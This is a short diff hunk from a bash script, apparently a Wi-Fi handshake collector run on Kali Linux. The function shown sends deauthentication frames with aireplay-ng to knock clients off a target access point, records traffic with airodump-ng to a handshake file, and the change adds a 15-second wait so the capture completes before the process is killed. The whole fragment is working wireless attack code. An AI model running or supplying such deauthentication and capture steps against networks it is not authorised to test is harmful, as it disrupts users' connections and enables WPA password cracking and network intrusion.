@@ -119,6 +119,7 @@ active() {
           aireplay-ng -a $BSSID -0 5 $interface &
           airodump-ng --bssid $BSSID --channel $Channel -w /home/kali/hscollector/shakes $interface &
           airodumpPID=`echo $!`
+          sleep 15
           echo "airodumpPID:"$airodumpPID
           kill -9 $airodumpPID
           checkHandshakes
